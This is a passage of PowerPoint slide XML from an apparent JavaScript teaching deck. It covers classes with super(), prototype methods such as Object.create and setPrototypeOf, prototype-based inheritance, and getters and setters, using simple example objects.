              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Person</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constructor</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super</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call</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the</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super</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>father</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class</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constructor</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this</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 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00108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study</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All</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days</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only</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study</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>work</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. No life!"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795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>live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"I </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>used</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>have</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> a life."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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</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jack</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267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Student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"Jack </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Student</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25</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13</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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jack</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jack</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jack</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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>jack</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live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jack</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study</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>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C6025B5-AC57-4C3C-B81C-42D31B5C3831}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Methods for Prototypes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="111619" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C9EA016C-5EAD-46C5-B712-ABEB1224149E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>Object.create</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>proto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>[, descriptors]) – creates an empty object with given </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>proto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> as [[Prototype]] and optional property </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>descriptors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>Object.getPrototypeOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) – returns the [[Prototype]] of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>Object.setPrototypeOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>object, proto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>) – sets the [[Prototype]] of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>proto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a: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032CA688-F206-40E5-9AD3-0F4B9900E288}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Inheriting Other Objects Using Prototypes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="112643" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E25420DA-681D-40BE-BF2B-95691FF792F5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1464385"/>
            <a:ext cx="10972800" cy="5141168"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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object1</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name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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"Jack"</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age:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>25</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>};</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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 = {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>hobby:</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gaming</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err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Object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setPrototypeOf</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object1</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hobby</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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 = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Object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create</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object1</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address</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"Baker </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Street</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address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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proto</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Object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getPrototypeOf</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proto</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object1</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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"Object3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>has</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>address</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hasOwnProperty</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address</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true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because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own</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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"Object3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>has</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name</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object3</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hasOwnProperty</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name</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false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because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inherited</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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"Object2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>own</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>properties</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err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Object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getOwnPropertyNames</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a: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property</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>in</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object2</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property</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hobby, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>name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age</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1600" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49"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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0261ACF3-B919-483E-8F2A-03ECBA819C6D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Setters and Getters</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113667" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4EF38D0A-F9DE-4A71-B0B1-FFBC600989A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>set</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> binds an object property to a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>setter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> function, which is called when attempting to set that property</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>propertyName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>newValue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" b="1"/>
              <a:t>get</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> binds an object property to a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1"/>
              <a:t>getter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t> function, which is called when attempting to read that property</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>get </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>propertyName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() {</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  // do something</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" i="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>returnValue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49"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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CF92E81C-E78A-42B6-BCC0-6366B62D7076}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
